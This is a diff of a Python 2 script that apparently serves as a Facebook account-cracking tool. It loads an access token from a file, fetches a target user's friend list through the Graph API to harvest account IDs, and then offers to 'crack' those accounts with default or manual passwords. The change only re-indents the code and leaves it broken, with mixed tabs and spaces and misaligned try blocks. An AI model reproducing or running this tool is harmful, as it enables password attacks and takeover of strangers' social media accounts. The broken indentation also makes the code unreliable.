@@ -140,32 +140,32 @@ def menu():
 def public():
     os.system("clear")
     banner()
-    try:
+        try:
 	    toket = open('login.txt','r').read()
 	    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
 	    a = json.loads(otw.text)
 	    nama = a['name']
 	    id = a['id']
-    except Exception as e:
+        except Exception as e:
 	    print ("   [•] Error : %s"%e)
 	    login()
     print("\n   [•] Type \'me\' To Dump From Friendlist")
     idp = raw_input("   [•] User ID Target : ")
-    try:
-	pok = requests.get("https://graph.facebook.com/"+idp+"?access_token="+toket)
-	sp = json.loads(pok.text)
-	print "   [•] Name           : "+sp["name"]
-    except KeyError:
-	print ("   [!] Wrong ID Target")
-	raw_input("\n   [ Back ]")
-	menu()
-    except requests.exceptions.ConnectionError:
-	print ("   [!] No Connection")
-	exit()
-    r = requests.get("https://graph.facebook.com/"+idp+"/friends?access_token="+toket)
-    z = json.loads(r.text)
-    for i in z['data']:
-	id.append(i['id'])
+        try:
+	   pok = requests.get("https://graph.facebook.com/"+idp+"?access_token="+toket)
+	   sp = json.loads(pok.text)
+	   print "   [•] Name           : "+sp["name"]
+        except KeyError:
+	    print ("   [!] Wrong ID Target")
+	    raw_input("\n   [ Back ]")
+	    menu()
+        except requests.exceptions.ConnectionError:
+	    print ("   [!] No Connection")
+	    exit()
+        r = requests.get("https://graph.facebook.com/"+idp+"/friends?access_token="+toket)
+        z = json.loads(r.text)
+        for i in z['data']:
+	    id.append(i['id'])
     print "   [•] Total ID       : "+str(len(id))
     mtd = raw_input("\n   [•] Crack With Default/Manual Pass [d/m] : ")
     if mtd=="":
